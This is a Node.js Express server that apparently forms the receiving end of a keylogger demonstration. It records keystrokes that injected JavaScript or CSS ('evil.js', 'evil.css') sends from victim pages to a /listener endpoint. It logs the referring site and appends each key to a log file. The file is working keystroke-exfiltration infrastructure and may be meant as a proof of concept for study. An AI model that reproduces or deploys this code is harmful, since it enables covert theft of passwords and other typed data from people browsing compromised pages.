const app = require("express")();
const fs = require("fs");
const http = require("http").Server(app);

// Define some colors for the console window
const COLORS = {
    reset: "\x1b[0m",
    cyan: "\x1b[36m"
};

app.get("/listener", function(req, res) {
    // If this is being fetched with a query string
    // i.e.: /listener?F12
    if(req._parsedUrl.search) {
        // Check referer (URL where the request came from)
        if(!req.headers.referer) {
            console.log("\nNo referer");
        } else {
            // We don't need http:// or https:// on this printed string
            const fromURL = req.headers.referer.replace(/https?:\/\//g, "");
            console.log("\nMessage from " + COLORS.cyan + fromURL + COLORS.reset);
        }

        // Remove '?' from query string (e.g.: "?a" becomes "a")
        let k = req._parsedUrl.search.slice(1);

        if(k.charAt(0) == '%' && k != "%")
            // If URI encoded (e.g., "%5B" = '[')
            k = decodeURIComponent(k);
        else if(k.length == 0)
            // Spaces may be trimmed, so if query
            // string is empty, it's likely a space
            k = " ";

        // Show in console what key was received
        console.log("Received '" + COLORS.cyan + k + COLORS.reset + "'");

        // Not all characters that we may receive truly exist
        let actual_character = true;

        switch(k) {
            case "Enter":
                // Actually replace the Enter key with line breaks
                k = "\n";
                break;
            case "Delete":
                // Shortened version improves log readability
                k = "Del";
                break;
            case "Backspace":
                // Visual representation of the backspace, better than the word
                k = "⌫";
                break;
            case "Dead": case "undefined": case "null":
                // This happens for keys such as "Ç" on BR-ABNT keyboards
                actual_character = false;
                break;
        }

        // Ignoring unknown characters
        if(actual_character) {

            // If it's not a single character, wrap it in < >
            if(k.length > 1)
                // e.g.: <Del>, <F5>
                k = "<" + k + ">";

            // Append that key to a log file; If the file
            // does not exist, this should create it
            fs.appendFile("./log.txt", k, function(err) {
                if(err) throw err;
            });
        }
    }

    // Set no cache headers in an *attempt* to stimulate CSS to
    // refetch previously fetched URLs; this didn't really work
    res.header("Cache-Control", "private, no-cache, no-store, must-revalidate");
    res.header("Expires", "-1");
    res.header("Pragma", "no-cache");

    res.sendStatus(304);  // 304 - Not Modified
});

app.get("/js", function(req, res) {
    res.sendFile(__dirname + "/js-keylogger/index.html");
});
app.get("/js/index.css", function(req, res) {
    res.sendFile(__dirname + "/js-keylogger/index.css");
});
app.get("/js/evil.js", function(req, res) {
    res.sendFile(__dirname + "/js-keylogger/evil.js");
});

app.get("/css", function(req, res) {
    res.sendFile(__dirname + "/css-keylogger/index.html");
});
app.get("/css/index.css", function(req, res) {
    res.sendFile(__dirname + "/css-keylogger/index.css");
});
app.get("/css/evil.css", function(req, res) {
    res.sendFile(__dirname + "/css-keylogger/evil.css");
});

http.listen(3000, function() {
    console.clear();
    console.log("Listening on *:3000\n");
});